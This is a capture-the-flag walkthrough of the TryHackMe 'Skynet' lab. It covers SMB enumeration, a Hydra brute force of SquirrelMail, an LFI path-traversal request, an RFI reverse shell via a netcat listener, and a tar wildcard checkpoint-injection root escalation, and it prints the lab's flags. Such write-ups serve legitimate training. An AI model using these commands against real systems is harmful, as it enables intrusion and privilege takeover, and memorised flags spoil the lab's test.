# TryHackMe — Skynet Walkthrough

## Enumeration

Started with Nmap:
```bash
nmap -A 10.10.169.141
```

![Nmap scan](images/{D39E35B1-9139-4EFD-97DD-1DD0042FE858}.png)

Found SMB on 445. Enumerated shares:
```bash
smbmap -H 10.10.169.141
```

![SMB shares](images/{94F3FE7D-E4C0-4884-BAFB-EA8EE64846A4}.png)

Connected to anonymous share:
```bash
smbclient //10.10.169.141/anonymous -N
```

![SMB anonymous](images/{8735866F-D8F0-4A76-9A35-D803BB7804B2}.png)

Found `attention.txt`:

![Attention.txt](images/{1932CF6F-95AA-4A11-AA2E-438824A85FF1}.png)

And `log1.txt` with passwords:

![log1.txt](images/{49A8F6D9-9FA4-487B-9390-69DE6480E85A}.png)

Ran dirb and found `/squirrelmail`.

## Brute Forcing SquirrelMail

Used Hydra with the password list:
```bash
hydra -l milesdyson -P log1.txt 10.10.169.141 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:incorrect"
```

![Hydra attack](images/{F9B33311-DEAE-43FF-B2F0-71565B89E677}.png)

![Hydra success](images/{A0EE99A0-79A0-4DE9-8875-5C4CE662D119}.png)

**Task 1:** `cyborg007haloterminator`

![SquirrelMail login](images/{6532C81D-9B04-4267-9814-517BB45BD026}.png)

Email revealed SMB password:

![Email](images/{717DEB1C-0850-4064-8921-10D17B577D6B}.png)

Connected to Miles' SMB share and found `important.txt`:

![important.txt](images/{3EACCCF6-373F-4282-B9F2-A45B2679A7BB}.png)

**Task 2:** `/45kra24zxs28v3yd`

## Finding CupPA CMS

![Miles page](images/{7949C6DF-231C-44BB-AA2A-ADBBBA4F29A6}.png)

Ran dirb on the hidden directory:
```bash
dirb http://10.10.169.141/45kra24zxs28v3yd/ /usr/share/wordlists/dirb/common.txt
```

![Gobuster](images/{8AF52894-654B-405B-B9FE-A7DB9EA93BE9}.png)

Found CupPA CMS:

![CupPA](images/{30C9768D-20A3-4496-A422-6CE2340448BA}.png)

Searched exploits:
```bash
searchsploit cuppa
```

![Searchsploit](images/{B31EA9AB-26F5-4E78-8CE6-DC197F26ADD1}.png)

**Task 3:** Remote File Inclusion

## Exploitation

Tested LFI:
```
http://10.10.237.236/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```

![LFI](images/{D08CBC5E-8FD7-40AD-AF14-98104F5B67D7}.png)

Started HTTP server:
```bash
python3 -m http.server 8000
```

![HTTP server](images/{D4F84F86-B4CE-4A8F-A4AE-F3B33002E12E}.png)

Set up listener:
```bash
nc -lvnp 1234
```

![Listener](images/{AE1358B3-D4A3-4C64-AFB2-A95ECA4204C2}.png)

Triggered RFI and got shell. Found user flag in `/home/milesdyson/user.txt`.

**Task 4:** `7ce5c2109a40f958099283600a9ae807`

## Privilege Escalation

Checked crontab:
```bash
cat /etc/crontab
```

![Crontab](images/{B2CE0050-2CE1-4E27-8274-CA2D1ED8D985}.png)

Backup script uses tar with wildcards. Exploited with checkpoint injection:
```bash
cd /var/www/html
printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > "--checkpoint=1"
```

After cron ran, got root with `/bin/bash -p`.

**Task 5:** `3f0372db24753accc7179a282cd6a949`
